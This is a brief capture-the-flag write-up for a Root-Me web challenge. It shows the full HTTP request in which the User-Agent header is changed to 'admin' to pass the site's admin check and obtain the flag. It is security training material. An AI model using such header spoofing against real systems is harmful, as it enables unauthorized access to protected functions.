# Question
User-Agent

## Description
The admin is really dumb

## Solution

This one was really simple, we have to verify as admin user so just intercept the burp request and change user to admin which gives the flag
`
GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: admin
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.1.1448696352.1759118406; _ga_SRYSKX09J7=GS2.1.s1759121098$o2$g1$t1759122883$j20$l0$h0
Connection: keep-alive
`
